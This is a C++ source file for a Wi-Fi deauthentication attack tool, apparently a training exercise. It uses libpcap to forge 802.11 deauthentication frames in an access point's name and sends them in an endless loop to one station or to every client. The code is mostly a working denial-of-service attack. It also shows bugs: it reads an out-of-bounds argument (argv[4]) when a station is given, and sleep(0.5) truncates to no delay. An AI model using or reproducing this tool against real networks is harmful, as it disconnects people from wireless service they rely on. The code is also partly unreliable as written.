#include "headers.h"

void usage();

#pragma pack(push, 1)
struct deauth_packet final
{
    radiotap_header radiotap_hdr;
    beacon_header beacon_hdr;
};
#pragma pack(pop)

int main(int argc, char *argv[])
{
    Mac AP;
    Mac station;
    bool flag = false; //true면 station 있음

    if((argc != 3) && (argc != 4))
    {
        usage();
        return -1;
    }

    char *dev = argv[1];
    AP = Mac(argv[2]);
    if(argc == 4)
    {
        flag = true;
        station = Mac((argv[4]));
    }
    else
        station = Mac::broadcastMac();

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    deauth_packet deauth_pkt;

    deauth_pkt.radiotap_hdr.it_version = 0;
    deauth_pkt.radiotap_hdr.it_pad = 0;
    deauth_pkt.radiotap_hdr.it_len = 12;
    deauth_pkt.radiotap_hdr.it_present = 0x00008004;
    deauth_pkt.radiotap_hdr.datarate = 0x02;
    deauth_pkt.radiotap_hdr.unknown = 0;
    deauth_pkt.radiotap_hdr.txflag = 0x0018;
    deauth_pkt.beacon_hdr.ver = 0;
    deauth_pkt.beacon_hdr.type = 0;
    deauth_pkt.beacon_hdr.subtype = 0xc;
    deauth_pkt.beacon_hdr.flags = 0;
    deauth_pkt.beacon_hdr.duration_id = 0x013a;
    deauth_pkt.beacon_hdr.dest_addr = station;
    deauth_pkt.beacon_hdr.src_addr = AP;
    deauth_pkt.beacon_hdr.bssid = AP;
    deauth_pkt.beacon_hdr.squence_num = 0;
    deauth_pkt.beacon_hdr.fixed = 7;

    while(true)
    {
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauth_pkt), sizeof(deauth_packet));
        if (res != 0)
        {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        printf("deauth attack sent \n");
        sleep(0.5);
    }
    pcap_close(handle);
    return 0;

}


void usage()
{
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

